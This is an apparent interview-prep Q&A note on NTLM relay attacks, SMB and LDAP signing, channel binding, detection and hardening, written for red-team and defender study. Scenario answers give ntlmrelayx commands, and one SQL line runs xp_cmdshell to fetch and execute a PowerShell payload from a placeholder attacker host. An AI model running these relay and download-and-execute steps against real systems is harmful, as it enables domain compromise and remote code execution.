---
tags: [interview, network-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Network Security"
topic: "QnA - Network Module 52"
---

# Network QnA - Module 52 - NTLM Relay and SMB Signing

## Custom ASCII Diagram: NTLM Relay Architecture
```text
  [Victim Machine]                   [Attacker (Relay Node)]                    [Target Server]
         |                                     |                                       |
         |-------- 1. NTLM Negotiate --------->|                                       |
         |         (Type 1 Message)            |                                       |
         |                                     |--------- 2. NTLM Negotiate ---------->|
         |                                     |          (Type 1 Message)             |
         |                                     |                                       |
         |                                     |<-------- 3. NTLM Challenge -----------|
         |                                     |          (Type 2 Message)             |
         |<------- 4. NTLM Challenge ----------|                                       |
         |         (Type 2 Message)            |                                       |
         |                                     |                                       |
         |-------- 5. NTLM Authenticate ------>|                                       |
         |         (Type 3 Message - Hash)     |                                       |
         |                                     |--------- 6. NTLM Authenticate ------->|
         |                                     |          (Type 3 Message - Hash)      |
         |                                     |                                       |
         |                                     |<-------- 7. Access Granted -----------|
         |                                     |          (Session Established)        |
         |                                     |======== 8. Malicious Actions ========X|
```

## Formal Technical Questions

### Q1: Detail the mechanics of an NTLM Relay attack. Why is NTLMv2 still susceptible to this attack despite incorporating server challenges?
**Answer:**
NTLM Relay is an On-Path (Man-in-the-Middle) attack where an attacker intercepts an authentication attempt from a victim and seamlessly forwards (relays) it to a target system. The objective is to authenticate to the target system under the context of the victim user without ever knowing their plaintext password or cracking their hash.
The mechanism flows in three stages:
1. **Negotiation (Type 1):** The victim attempts to authenticate to the attacker (believing the attacker is a legitimate service like an SMB share or Web server). The attacker holds this connection and initiates a new connection to the real Target Server, passing along the victim's Type 1 message.
2. **Challenge (Type 2):** The Target Server responds to the attacker with a cryptographic challenge. The attacker forwards this exact challenge back to the victim.
3. **Authentication (Type 3):** The victim calculates the NTLM response by encrypting the challenge using their NTLM hash and sends it to the attacker. The attacker relays this valid response to the Target Server. The Target Server validates the response and grants the attacker an authenticated session.
**Why NTLMv2 is vulnerable:** NTLMv2 introduces a stronger cryptographic challenge-response mechanism, incorporating timestamps and client challenges to prevent simple Pass-the-Hash or replay attacks. However, NTLMv2 does *not* bind the authentication attempt to the specific TLS channel or the specific service being accessed (lack of channel binding). Because the attacker transparently shuttles the challenge and response between the victim and the target, the Target Server perceives the cryptographic math to be correct, unaware that the victim intended to connect to a different machine.

### Q2: What is SMB Signing, and exactly how does it prevent SMB-to-SMB NTLM Relaying?
**Answer:**
SMB Signing (Server Message Block Signing) is a security mechanism designed to prevent Man-in-the-Middle and NTLM Relay attacks over the SMB protocol. It works by appending a cryptographic signature to every SMB packet transmitted over the network.
**Mechanism:** Once the NTLM authentication phase successfully concludes, both the client and the server derive a cryptographic Session Key based on the user's password hash. This Session Key is never transmitted over the network. Both parties use this Session Key to generate an HMAC-SHA256 signature (in SMBv2/v3) for every subsequent packet payload.
**Prevention of SMB Relaying:**
In an SMB Relay attack, the attacker forwards the authentication to the Target Server. The Target Server authenticates the session and generates a Session Key. The victim also generates a Session Key.
However, *the attacker does not know the user's password hash*. Consequently, the attacker is entirely incapable of calculating the required Session Key. When the attacker attempts to interact with the Target Server (e.g., executing a command or mapping a drive), the Target Server demands that the packets be signed with the Session Key. Because the attacker cannot sign the packets, the Target Server instantly drops the connection with an `STATUS_ACCESS_DENIED` error. SMB Signing effectively terminates the session post-authentication because the attacker lacks the cryptographic material to maintain it.

### Q3: Explain the concept of Cross-Protocol NTLM Relaying. Why is relaying from HTTP to SMB often successful even when SMB-to-SMB relaying is blocked?
**Answer:**
Cross-Protocol NTLM Relaying involves intercepting an authentication attempt over one protocol (e.g., HTTP, LDAP) and relaying it to a completely different protocol (e.g., SMB, IMAP).
This technique is exceptionally powerful for bypassing protocol-specific protections. 
**Why HTTP to SMB succeeds:**
If a network enforces SMB Signing, an attacker cannot relay an incoming SMB authentication to an outgoing SMB connection. However, HTTP does not inherently implement a signing mechanism akin to SMB Signing. 
If an attacker coerces a victim into authenticating to an attacker-controlled HTTP server, the attacker receives the NTLM Type 1 message over HTTP. The attacker then initiates an SMB connection to the Target Server. The Target Server issues the SMB Challenge (Type 2). The attacker wraps this SMB challenge inside an HTTP 401 Unauthorized response and sends it to the victim. The victim's browser computes the NTLM response and sends it back via HTTP. The attacker strips the HTTP headers, formats the Type 3 response for SMB, and relays it to the Target Server.
Because the authentication originated over HTTP, the victim client does not negotiate SMB Signing parameters. The Target Server accepts the valid NTLM Type 3 message. If the Target Server does not strictly *require* SMB Signing (e.g., standard Windows workstations default to 'Enabled' but not 'Required'), the attacker successfully establishes the session, bypassing the SMB-to-SMB restrictions entirely.

### Q4: Explain the differences between NTLMv1 and NTLMv2 in the context of relay attacks. If NTLMv1 is enabled, how does it alter the attacker's methodology?
**Answer:**
NTLMv1 relies on DES encryption, utilizing a predictable challenge-response mechanism. NTLMv2 introduces HMAC-MD5 and incorporates a client challenge and timestamp to significantly complicate offline cracking and prevent simple replay.
**Context of Relay Attacks:** Both NTLMv1 and NTLMv2 are equally vulnerable to NTLM Relaying if signing or channel binding is not enforced. The relay tool simply passes the bytes back and forth without needing to decrypt them.
**Alteration of Methodology with NTLMv1:**
If an attacker discovers NTLMv1 is enabled (often due to legacy compatibility), their methodology shifts from *relaying* to *direct cracking*. NTLMv1's cryptographic implementation is fundamentally broken. An attacker can capture the NTLMv1 challenge and response (using Responder or Inveigh). Because the DES encryption key space is so small, an attacker can use a service like crack.sh or custom Rainbow Tables to recover the NTLM hash of the user in seconds or minutes, guaranteeing a 100% success rate. Once the hash is recovered, the attacker simply performs a Pass-the-Hash attack directly, bypassing the need to maintain an active relay session and allowing lateral movement against any host.

## Scenario-Based Questions

### Q5: You are on a Red Team engagement. You have LLMNR/NBT-NS spoofing running via Responder, capturing hashes. You notice SMB Signing is strictly enforced across the entire domain (Servers and Workstations). How do you pivot your NTLM Relay attack to still achieve code execution?
**Answer:**
If SMB Signing is universally required, SMB-to-SMB relaying is dead. I must pivot to Cross-Protocol relaying, specifically targeting protocols that do not enforce signing or channel binding by default.
1. **Target Identification:** I will scan the network for internal LDAP servers (Domain Controllers) or AD CS (Active Directory Certificate Services) web enrollment interfaces.
2. **Relay to LDAP:** I will reconfigure my relay tool (e.g., `ntlmrelayx.py`) to target the Domain Controller via LDAP or LDAPS. `ntlmrelayx.py -t ldap://<DC-IP> --escalate-user <My-Controlled-User>`. 
3. **Execution:** When Responder captures an incoming authentication (e.g., over HTTP or SMB), `ntlmrelayx` will relay it to the DC's LDAP interface. If the victim has sufficient privileges (e.g., an Account Operator or Domain Admin), I can perform LDAP-based attacks: modifying ACLs to grant my controlled user DCSync rights, adding my user to the Domain Admins group, or executing a Resource-Based Constrained Delegation (RBCD) attack.
4. **Relay to AD CS (ESC8):** Alternatively, I will relay HTTP authentication to the AD CS Web Enrollment HTTP endpoint. I will request a client authentication certificate on behalf of the victim. Once I obtain the certificate, I can request a Kerberos TGT (using Rubeus) and execute commands as the victim, completely bypassing SMB Signing.

### Q6: You are attempting an NTLM Relay attack to a Domain Controller using HTTP-to-LDAP. However, the relay fails, and the logs indicate "LDAP Signing is Required." How do you adapt your attack methodology to bypass this?
**Answer:**
When LDAP Signing is enforced on the Domain Controller, standard NTLM relaying to LDAP will fail post-authentication because, much like SMB Signing, the attacker cannot sign the LDAP queries without the user's Session Key.
To bypass this, I must pivot away from NTLM and leverage a protocol that establishes a secure, encrypted channel *before* authentication, or target a different service entirely.
1. **Pivot to LDAPS (LDAP over SSL/TLS):** If the DC supports LDAPS (port 636), the encryption is handled by the TLS tunnel, not by the NTLM Session Key. I will change my relay target to `ldaps://<DC-IP>`. Because the TLS tunnel provides confidentiality and integrity, LDAP Signing is implicitly satisfied. If channel binding is not explicitly enforced for LDAPS, the NTLM relay will succeed, allowing me to modify AD objects.
2. **Pivot to AD CS (ESC8):** As mentioned previously, relaying to the HTTP endpoint of the Certificate Authority is highly effective. The HTTP interface does not enforce LDAP signing rules, allowing the extraction of a machine or user certificate.
3. **Downgrade to NTLMv1:** If the environment allows NTLMv1, I can capture the challenge/response, crack the much weaker NTLMv1 hash offline using Rainbow Tables in seconds, and simply authenticate directly, abandoning the relay strategy.

### Q7: During a pentest, you successfully relay an NTLM connection to an MS-SQL server. What actions can you perform via this relayed connection to achieve OS-level code execution?
**Answer:**
Relaying to MS-SQL (TCP 1433) is highly lucrative if the victim has SA (System Administrator) privileges or equivalent rights on the database.
Once `ntlmrelayx` establishes the authenticated session, I will execute a sequence of SQL queries to gain OS-level execution:
1. **Enable xp_cmdshell:** The primary objective is to enable the `xp_cmdshell` extended stored procedure, which allows executing OS commands. I will send the query: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`.
2. **Command Execution:** Once enabled, I can execute arbitrary commands in the context of the SQL Server service account (often `NETWORK SERVICE` or a dedicated domain account). For example: `EXEC xp_cmdshell 'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker-ip/payload.ps1'')"'`.
3. **Lateral Movement:** If the SQL service account is a high-privileged domain account, I will dump the local SAM database, search for cleartext credentials in memory, or use the execution to map further into the network.

## Deep-Dive Defensive Questions

### Q8: Explain the concept of EPA (Extended Protection for Authentication) and Channel Binding Tokens (CBT). How do these mechanisms specifically defeat Cross-Protocol NTLM Relaying?
**Answer:**
Extended Protection for Authentication (EPA) and Channel Binding Tokens (CBT) are designed to defeat Man-in-the-Middle and Cross-Protocol relaying attacks, specifically when authenticating to services wrapped in TLS (like HTTPS or LDAPS).
**The Vulnerability:** In a standard relay attack against HTTPS, the attacker establishes a TLS session with the Target Server. The victim authenticates over plain HTTP to the attacker. The attacker relays the NTLM blobs over the TLS channel to the Target. The Target validates the NTLM blob, unaware that the authentication originated outside of the TLS tunnel.
**The Fix (EPA & CBT):**
When EPA is enabled, the client calculates a Channel Binding Token (CBT). The CBT is a cryptographic hash of the Target Server's TLS certificate. 
1. The client securely embeds this CBT inside the NTLM Type 3 authentication message.
2. When the Target Server receives the Type 3 message, it extracts the client's CBT.
3. The Target Server then calculates its own CBT based on its actual TLS certificate and compares it to the CBT provided by the client.
**Defeating the Relay:** In a relay scenario, the victim generates the CBT based on the attacker's TLS certificate (or sends no CBT if connecting via HTTP). The Target Server receives the relayed Type 3 message and compares the victim's CBT against its own TLS certificate. The CBTs will mismatch, instantly alerting the Target Server that the authentication was intercepted and relayed. The server terminates the connection, neutralizing the attack.

### Q9: As a network defender, how do you completely eradicate NTLM Relay attacks in a modern enterprise network? Detail the necessary Group Policy and infrastructure configurations.
**Answer:**
Eradicating NTLM Relay requires a defense-in-depth approach targeting all susceptible protocols.
1. **Require SMB Signing Universally:** Deploy a GPO to enforce "Microsoft network server: Digitally sign communications (always)" to `Enabled` on ALL workstations and servers, not just Domain Controllers. This absolutely kills SMB-to-SMB relaying.
2. **Enforce LDAP Signing and Channel Binding:** Configure Domain Controllers to require LDAP signing via the GPO: "Domain controller: LDAP server signing requirements" set to `Require signing`. Furthermore, configure the registry key `LdapEnforceChannelBinding` to `2` (Strict) to prevent Cross-Protocol relaying to LDAPS.
3. **Enable EPA on Web Services:** For critical infrastructure like Exchange (OWA/EWS) and AD CS Web Enrollment, enable Extended Protection for Authentication (EPA) within IIS to mandate Channel Binding Tokens.
4. **Disable LLMNR and NBT-NS:** NTLM Relay relies heavily on name resolution spoofing to coerce authentication. Disable LLMNR via GPO ("Turn off multicast name resolution") and disable NetBIOS over TCP/IP in the DHCP scope options to remove the attacker's primary coercion vector.
5. **Phase Out NTLM Entirely:** The ultimate solution is to disable NTLM authentication domain-wide and rely exclusively on Kerberos. Use the "Network security: Restrict NTLM" policies to audit and eventually block all NTLM traffic.

### Q10: What are the telltale indicators of an active NTLM Relay attack in Windows Event Logs, and how would you build a SIEM rule to detect it?
**Answer:**
Detecting NTLM relaying involves identifying authentication anomalies that indicate the source of the authentication is not the actual user's machine.
1. **Event ID 4624 (Logon):** Look for Logon Type 3 (Network Logon). The critical indicator is a mismatch between the `Workstation Name` and the `Source Network Address`. In a relay attack, the victim's machine generates the NTLM response, embedding its own `Workstation Name` in the payload. However, the connection physically originates from the Attacker's IP. A SIEM rule alerting on `Workstation Name != Resolved Hostname of Source IP` is highly effective.
2. **Event ID 4624 Authentication Package:** Ensure the authentication package is NTLM. High volumes of NTLM logons to a Domain Controller from a single non-administrative IP address should trigger an anomaly alert.
3. **Event ID 5140 (A network share object was accessed):** If the attacker successfully relays to a file server, they will map the IPC$ or C$ share. Correlate rapid, successive access to administrative shares originating from unexpected IPs.
4. **LDAP Anomalies (Event ID 4662):** If relaying to LDAP to perform DCSync or RBCD, monitor for Event 4662 detailing modifications to critical attributes like `msDS-AllowedToActOnBehalfOfOtherIdentity` or `DS-Replication-Get-Changes`, correlated with an NTLM network logon.

### Q11: Explain the NTLM authentication flow over HTTP (WWW-Authenticate: NTLM). How does the base64 encoded blob encapsulate the Type 1, 2, and 3 messages?
**Answer:**
NTLM over HTTP involves encapsulating the NTLM binary messages within the HTTP `Authorization` and `WWW-Authenticate` headers, utilizing base64 encoding to maintain compatibility with text-based HTTP.
1. **Initial Request:** The client makes an unauthenticated GET request to an IIS server.
2. **The Challenge (HTTP 401):** The server responds with `HTTP 401 Unauthorized` and includes the header `WWW-Authenticate: NTLM`. This indicates the server requires NTLM.
3. **Type 1 (Negotiate):** The client sends a new request. It embeds the Type 1 Negotiate message in the header: `Authorization: NTLM <Base64-Encoded-Type1-Blob>`. This blob contains supported encryption flags and workstation name.
4. **Type 2 (Challenge):** The server processes the Type 1 message and responds with another `HTTP 401 Unauthorized`. This time, the header is `WWW-Authenticate: NTLM <Base64-Encoded-Type2-Blob>`. This blob contains the server's random 8-byte challenge.
5. **Type 3 (Authenticate):** The client calculates the response using its password hash and the challenge. It sends a final request: `Authorization: NTLM <Base64-Encoded-Type3-Blob>`. This final blob contains the encrypted response, username, and domain.
6. **Authorization:** The server validates the Type 3 response. If successful, it responds with `HTTP 200 OK`. 
In an HTTP-to-SMB relay attack, the attacker transparently extracts the Base64 Type 1, decodes it, formats it for SMB, sends it to the target, receives the SMB Type 2 challenge, Base64 encodes it, sends it to the victim over HTTP, and repeats the cycle for the final Type 3 message.

## Real-World Attack Scenario
An internal penetration testing team deploys a rogue device onto the corporate LAN. They immediately initialize `Responder.py` to listen for broadcast traffic. A network administrator attempts to access a non-existent file share (`\\fileserver01-typo\share`), triggering an LLMNR broadcast request.
Responder intercepts the broadcast, claims to be the file server, and forces the administrator's machine to authenticate. Simultaneously, the pentest team runs `ntlmrelayx.py -tf target_servers.txt -smb2support`. 
The administrator's NTLM Type 1 message is caught by Responder and handed to `ntlmrelayx`. The relay tool forwards the authentication to `Exchange-Server-01`, a highly privileged asset that, critically, has SMB Signing set to "Enabled" but not "Required".
The relay succeeds. Because the administrator's account possesses local admin rights on the Exchange server, `ntlmrelayx` immediately drops a malicious service executable (`service.exe`) onto the admin share, executes it via the Service Control Manager, and establishes a SYSTEM-level reverse shell, compromising the email infrastructure within minutes.

## Chaining Opportunities
- **LLMNR/NBT-NS Spoofing + NTLM Relay:** The classic combo. Spoofing forces the authentication, and relaying weaponizes it without needing to crack the hash.
- **PetitPotam/DFSCoerce + NTLM Relay (ESC8):** Utilizing coercion protocols to force a Domain Controller to authenticate to an attacker machine. The attacker relays this authentication to the AD CS Web Enrollment (ESC8) to mint a Domain Controller certificate, leading to immediate domain takeover.
- **IPv6 SLAAC Spoofing (mitm6) + NTLM Relay:** Taking over the IPv6 DNS settings of a network to reroute all domain traffic to the attacker, providing an endless stream of authentication attempts to relay to LDAP or SMB.

## Related Notes
- [[52 - LLMNR and NBT-NS Poisoning]]
- [[52 - SMB Protocol Security]]
- [[52 - Active Directory Certificate Services Attacks]]
- [[52 - Windows Coercion Techniques]]
